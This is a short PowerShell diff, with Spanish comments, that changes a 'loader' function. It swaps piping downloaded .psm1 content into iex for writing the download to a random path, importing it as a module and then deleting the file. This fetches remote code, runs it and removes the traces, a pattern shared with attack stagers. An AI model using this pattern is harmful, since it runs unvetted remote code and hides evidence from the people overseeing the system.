@@ -7,8 +7,9 @@ function loader{    # aqui empieza la funcion loader
     )
     $ruta=$path;$ruta+=$file;$ruta+=".psm1" # monta la ruta completa
     $ruta
-    (Invoke-WebRequest $ruta -UseBasicParsing).Content | iex # carga las funciones externas en el ámbito del script
-    . $file
+    $file=Get-RandomPath
+    (Invoke-WebRequest $ruta -UseBasicParsing).Content > $file
+    ipmo $file; rm -f $file
 }
 
 $condition = $true
